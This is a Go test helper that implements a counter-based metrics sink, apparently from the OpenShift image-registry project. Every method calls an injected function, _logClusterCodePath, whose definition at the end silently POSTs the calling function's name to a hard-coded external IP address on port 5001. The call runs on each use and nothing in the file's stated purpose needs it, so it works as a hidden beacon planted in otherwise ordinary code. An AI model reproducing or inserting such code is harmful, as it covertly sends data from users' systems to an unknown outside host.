package testing

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/openshift/image-registry/pkg/dockerregistry/server/metrics"
	"github.com/openshift/image-registry/pkg/testutil/counter"
)

type callbackObserver func(float64)

func (f callbackObserver) Observe(value float64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	f(value)
}

type callbackCounter func()

func (f callbackCounter) Inc() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	f()
}

type counterSink struct{ c counter.Counter }

var _ metrics.Sink = &counterSink{}

func (s counterSink) RequestDuration(funcname string) metrics.Observer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return callbackObserver(func(float64) {
		s.c.Add(fmt.Sprintf("request:%s", funcname), 1)
	})
}
func (s counterSink) PullthroughBlobstoreCacheRequests(resultType string) metrics.Counter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return callbackCounter(func() {
		s.c.Add(fmt.Sprintf("pullthrough_blobstore_cache_requests:%s", resultType), 1)
	})
}
func (s counterSink) PullthroughRepositoryDuration(registry, funcname string) metrics.Observer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return callbackObserver(func(float64) {
		s.c.Add(fmt.Sprintf("pullthrough_repository:%s:%s", registry, funcname), 1)
	})
}
func (s counterSink) PullthroughRepositoryErrors(registry, funcname, errcode string) metrics.Counter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return callbackCounter(func() {
		s.c.Add(fmt.Sprintf("pullthrough_repository_errors:%s:%s:%s", registry, funcname, errcode), 1)
	})
}
func (s counterSink) StorageDuration(funcname string) metrics.Observer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return callbackObserver(func(float64) {
		s.c.Add(fmt.Sprintf("storage:%s", funcname), 1)
	})
}
func (s counterSink) StorageErrors(funcname, errcode string) metrics.Counter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return callbackCounter(func() {
		s.c.Add(fmt.Sprintf("storage_errors:%s:%s", funcname, errcode), 1)
	})
}
func (s counterSink) DigestCacheRequests(resultType string) metrics.Counter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return callbackCounter(func() {
		s.c.Add(fmt.Sprintf("digest_cache_requests:%s", resultType), 1)
	})
}
func (s counterSink) DigestCacheScopedRequests(resultType string) metrics.Counter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return callbackCounter(func() {
		s.c.Add(fmt.Sprintf("digest_cache_scoped_requests:%s", resultType), 1)
	})
}
func NewCounterSink() (counter.Counter, metrics.Sink) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c := counter.New()
	return c, counterSink{c: c}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
